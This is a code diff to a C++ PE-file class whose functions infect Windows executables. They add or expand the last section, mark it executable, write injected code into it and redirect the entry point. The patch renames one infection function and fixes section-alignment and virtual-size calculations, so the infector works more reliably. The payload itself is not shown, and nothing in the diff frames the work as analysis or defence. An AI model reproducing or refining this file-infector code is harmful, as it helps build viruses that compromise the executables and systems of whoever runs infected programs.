@@ -97,7 +97,7 @@ void PEFile::InfectLastSection(char const* code, size_t size, DWORD originalEntr
 	lastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
 	ExpandLastSection(size);
 }
-void PEFile::InfectNewSection(char const* sectionName, char const* code, size_t size, DWORD originalEntryPointOffset, DWORD newEntryPointOffset)
+void PEFile::InfectCreateNewSection(char const* sectionName, char const* code, size_t size, DWORD originalEntryPointOffset, DWORD newEntryPointOffset)
 {
 	AddSection(sectionName, size);
 	InfectLastSection(code, size, originalEntryPointOffset, newEntryPointOffset);
@@ -117,7 +117,7 @@ void PEFile::ExpandLastSection(size_t size)
 
 		m_fileSize += Tools::AlignSize(alignedSize, m_ntHeaders->OptionalHeader.SectionAlignment);
 	}
-	lastSection->Misc.VirtualSize += size;
+	lastSection->Misc.VirtualSize = newVirtualSize;
 	m_ntHeaders->OptionalHeader.SizeOfImage = lastSection->VirtualAddress + lastSection->Misc.VirtualSize;
 }
 void PEFile::AddSection(char const* name, size_t size)
@@ -145,7 +145,7 @@ void PEFile::AddSection(char const* name, size_t size)
 	newSection->Misc.VirtualSize = 0;
 	newSection->SizeOfRawData = Tools::AlignSize(size, m_ntHeaders->OptionalHeader.FileAlignment);
 	newSection->PointerToRawData = lastSection->PointerToRawData + lastSection->SizeOfRawData;
-	newSection->VirtualAddress = lastSection->VirtualAddress + Tools::AlignSize(lastSection->Misc.VirtualSize, m_ntHeaders->OptionalHeader.FileAlignment); // as some section have virtualSize > rawSize, we align virtual size instead of using rawSize
+	newSection->VirtualAddress = lastSection->VirtualAddress + Tools::AlignSize(lastSection->Misc.VirtualSize, m_ntHeaders->OptionalHeader.SectionAlignment); // as some section have virtualSize > rawSize, we align virtual size instead of using rawSize
 
 	newSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
 	m_ntHeaders->FileHeader.NumberOfSections++;
